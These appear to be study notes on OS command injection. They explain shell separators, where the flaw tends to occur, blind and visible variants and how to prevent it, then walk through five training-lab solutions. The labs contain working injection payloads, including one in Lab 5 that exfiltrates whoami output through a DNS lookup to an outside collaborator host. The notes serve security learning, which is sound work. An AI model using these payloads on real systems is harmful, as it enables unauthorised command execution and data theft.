also called
# Command or Shell injection

It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data

**OS Command Injection** is a vulnerability where you force the website to run **System Commands** on its own server.

OS Command Injection occurs when:

    - Application executes system commands using user input
    - User input is not properly sanitized
    - Attacker injects additional commands
    - Server executes attacker's commands

### **How it Works (The "Separators")**

The server runs commands in a line. Hackers use **Separators** to end the first command and start their own.

**The Magic Symbols (Separators):**

- **`;` (Semicolon):** "Finish the first command, **THEN** do mine." (Linux only)
    
- **`|` (Pipe):** "Take the first command's result, **GIVE** it to mine." (Linux & Windows)
    
- **`&` (Ampersand):** "Run the first command **AND** mine together." (Linux & Windows)**xample:**


| **Separator**<br> | **Linux** | \|**Windows** |
| ----------------- | --------- | ------------- |
| `;`(Semicolon)    | ✅ **Yes** | ❌ **No**      |
| `&` (Ampersand)   | ✅ **Yes** | ✅ **Yes**     |
| `&&` (Double And) | ✅ **Yes** | ✅ **Yes**     |
| \| (Pipe)         | ✅ **Yes** | ✅ **Yes**     |
| `%0a` (New Line)  | ✅ **Yes** | ❌ **No**      |



example:-

- **Website:** "Enter IP to ping."
    
- **You type:** `google.com | whoami`
    
- **Server runs:** `ping google.com` -> takes result -> runs `whoami` -> shows you `root` (Admin user).


### **Vulnerable Spots (Where to look?)**

Look for any feature where the website talks to the **Operating System**.

1. **Checking Status:** (Ping, IP check, Domain check).
    
2. **File Operations:** (Image conversion, Video processing).
    
3. **Sending Emails:** (Contact forms that use system mail).
    
4. **Admin Tools:** (System backup, Log viewer).


### **Types of Attack**

**A. Verbose (Visible)**

- **What happens:** You execute a command, and the **result appears on your screen**.
    
- **Example:** You type `| whoami` and the website shows `root`.
    

**B. Blind (Invisible)**

- **What happens:** You execute a command, but the **screen shows nothing**.
    
- **How to hack:** You make the server "Signal" you.
    
    - **Time Delay:** Type `| sleep 10`. If the website freezes for 10 seconds, you are in.
        
    - **Redirection:** Type `whoami > output.txt`. Then open `website.com/output.txt` to see the result.


### **The Impact (Why is it dangerous?)**

This is **Critical**.

- **RCE (Remote Code Execution):** You fully control the server.
    
- **Theft:** You can read passwords and files.
    
- **Destruction:** You can delete the entire OS.


### **Prevention (How to Fix)**

If you are the developer:

1. **Stop using Shell:** Don't use functions like `exec()` or `system()`. Use proper libraries instead.
    
2. **Whitelist Input:** Only allow safe characters (like A-Z, 0-9). **Block** symbols like `;` `|` `&`.



# Lab 1: OS command injection, simple case

**Type:** Verbose (Visible Output)

- **The Scenario:** A shopping website lets you "Check Stock" for a product.
    
- **The Goal:** Execute the `whoami` command to see the current user name.
    
- **Where is the hole?** The `storeID` parameter. The server probably runs something like `stock_check.sh [storeID]`.


**Solution:**

1. Click "Check Stock".
    
2. Intercept the request in Burp Suite.
    
3. Change the `storeId` parameter to: `1|whoami`
    
4. Send the request.
    
5. **Result:** You will see the stock count AND the user name (e.g., `peter` or `whoami`) in the response.
    

**Why it works:** The `|` (pipe) tells the server: _"Run the stock check command, take its output, and feed it to `whoami`."_ Since `whoami` doesn't need input, it just runs and shows the result.


# Lab 2: Blind OS command injection with time delays

- **The Scenario:** A "Submit Feedback" form.
    
- **The Goal:** Prove vulnerability by making the server freeze for 10 seconds.
    
- **Where is the hole?** The `email` field. The server runs a `mail` command to send feedback.


Solution:

    Fill out the feedback form.

    Intercept the request.

    Change the email parameter to: email=x||ping -c 10 127.0.0.1||

    Send the request.

    Result: The response will take 10 seconds to come back.

Why it works: Since we can't see the output, we use ping.

    || (OR): Means "If the email part fails (x), run the next command."

    ping -c 10: Sends 10 packets (taking 10 seconds).

    127.0.0.1: This is "localhost" (the server itself). We are telling the server to ping itself.



# **Lab 3: Blind OS command injection with output redirection**

> **Level:** Practitioner (Medium) **Type:** Blind (File Write)

- **The Scenario:** Feedback form (same as Lab 2).
    
- **The Goal:** Even though it's blind, we want to see the output of `whoami`.
    
- **Logic:** We can't see the screen, but we can **write to a file** in a folder we can access (like the images folder).
    

**Solution Steps:**

1. Intercept the Feedback request.
    
2. Change the `email` parameter to: `email=||whoami>/var/www/images/output.txt||`
    
3. Send request. (Server creates the file silently).
    
4. Now, open any image on the website in a new tab.
    
5. Change the URL filename to `output.txt`.
    
    - Example: `.../image?filename=output.txt`
        
6. **Result:** You will see the username displayed on the screen.
    

**Why it works:** The `>` symbol redirects the output. Instead of showing it on screen (which is blocked), it saves the result inside `output.txt`. Since the `/var/www/images/` folder is public, we can read it.


# **Lab 4: Blind OS command injection with out-of-band interaction**

> **Level:** Practitioner (Medium) **Type:** Blind (OAST - Out of Band)

- **The Scenario:** Feedback form.
    
- **The Goal:** Prove injection by forcing the server to talk to _our_ server (Burp Collaborator).
    
- **Logic:** Sometimes we can't write files. We use DNS to signal us.
    

**Solution Steps:**

1. Open **Burp Collaborator** client. Click "Copy to clipboard" to get your unique payload url (e.g., `x.burpcollaborator.net`).
    
2. Intercept the Feedback request.
    
3. Change the `email` parameter to: `email=x||nslookup x.burpcollaborator.net||`
    
4. Send request.
    
5. Go back to Burp Collaborator and click "Poll now".
    
6. **Result:** You will see a DNS query entry. This proves the server executed `nslookup`.
    

**Why it works:** `nslookup` is a command that asks "What is the IP address of this website?". By asking for _your_ collaborator address, the server is forced to connect to you.

**1. The Concept:** OAST (Out-of-Band) is like asking a mute hostage to **"Ring a Bell"** if they are alive. They can't speak (Blind), but the sound of the bell (DNS Query) proves they are there.
```
**OAST (Out-of-Band Application Security Testing)**
```

**2. Without Burp:** You would need to buy a domain and set up a listener to catch DNS requests.

**3. With Burp:** Burp Collaborator acts as that listening server for you, saving time and money.

**4. Why DNS?** Because most companies block HTTP requests (Firewall), but they almost ALWAYS allow DNS queries (because servers need to resolve names to work).



# **Lab 5: Blind OS command injection with out-of-band data exfiltration**

> **Level:** Expert (Hard) **Type:** Blind (OAST Data Theft)

- **The Scenario:** Feedback form.
    
- **The Goal:** Steal the current user's name using DNS.
    
- **Logic:** We will put the command `whoami` _inside_ the DNS query.
    

**Solution Steps:**

1. Get your Burp Collaborator link (e.g., `attacker.net`).
    
2. Intercept the Feedback request.
    
```
3. Change the `email` parameter to: ||nslookup `whoami`.YOUR-COLLABORATOR-ID.burpcollaborator.net|| _(Note the backticks around whoami)_
```
    
4. Send request.
    
5. Check Burp Collaborator.
    
6. **Result:** You will see a DNS query for something like: `peter.attacker.net`.
    
    - The first part (`peter`) is the result of `whoami`.
        

**Why it works:** The **Backticks** (`` ` ``) tell the server: _"Run the command inside these ticks first, and put the result here."_ So, `nslookup` whoami`.attacker.net` becomes `nslookup peter.attacker.net`. The server sends "peter" to you as a subdomain.